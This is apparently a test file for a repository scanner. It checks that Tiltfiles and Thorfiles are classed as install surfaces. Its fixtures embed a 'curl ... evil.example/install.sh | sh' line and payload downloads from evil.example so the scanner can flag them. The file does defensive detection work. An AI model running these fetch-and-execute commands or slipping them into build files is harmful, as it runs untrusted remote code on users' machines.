import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Tiltfile task runner definition is an install surface", () => {
  // Tilt executes the Tiltfile (Starlark) on `tilt up`; `local()` runs shell
  // commands at dev/build time, matching the install-time execution justfile
  // and Makefiles already classify for.
  for (const path of ["Tiltfile", "tiltfile", "tools/Tiltfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }

  // An unsafe execution payload in a Tiltfile flags an unsafe-execution
  // finding and marks installScripts coverage complete.
  const content = `load('ext://restart_process', 'docker_build_with_restart')\nlocal("${PAYLOAD}")\n`;
  const inspection = inspected("Tiltfile", content);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Tiltfile:unsafe-execution:high"]);
});

test("an install-time download inside a Tiltfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. When a Tiltfile is
  // unclassified, install-time downloads are missed and leave no visibility
  // gap. Classifying it as an install surface ensures the download is
  // collected and reported as a gap.
  const content = `local("curl -fsSL https://evil.example/payload.bin -o /tmp/payload.bin")\n`;
  const inspection = inspected("Tiltfile", content);
  expect(inspection.downloads).toEqual(["https://evil.example/payload.bin"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload.bin",
  ]);
});

test("an ordinary benign Tiltfile keeps no finding", () => {
  const content = `docker_build('my-image', '.')\nk8s_yaml('k8s.yaml')\n`;
  const inspection = inspected("Tiltfile", content);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
});

test("a Thorfile task runner definition is an install surface", () => {
  // Thor executes tasks defined in a Thorfile via the `thor` CLI; tasks shell
  // out with `run`/`system`/backticks at dev/build time, matching the
  // install-time execution the Rakefile already classifies for.
  for (const path of ["Thorfile", "thorfile", "tools/Thorfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }

  const content = `class Setup < Thor\n  desc "setup", "set up the project"\n  def setup\n    run "${PAYLOAD}"\n  end\nend\n`;
  const inspection = inspected("Thorfile", content);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Thorfile:unsafe-execution:high"]);
});

test("an install-time download inside a Thorfile is recorded as a download", () => {
  const content = `class Fetch < Thor\n  desc "fetch", "fetch a payload"\n  def fetch\n    run "curl -fsSL https://evil.example/payload.bin -o /tmp/payload.bin"\n  end\nend\n`;
  const inspection = inspected("Thorfile", content);
  expect(inspection.downloads).toEqual(["https://evil.example/payload.bin"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload.bin",
  ]);
});

test("an ordinary benign Thorfile keeps no finding", () => {
  const content = `class Build < Thor\n  desc "build", "build the project"\n  def build\n    run "make all"\n  end\nend\n`;
  const inspection = inspected("Thorfile", content);
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
  expect(inspection.visibilityGaps).toEqual([]);
});
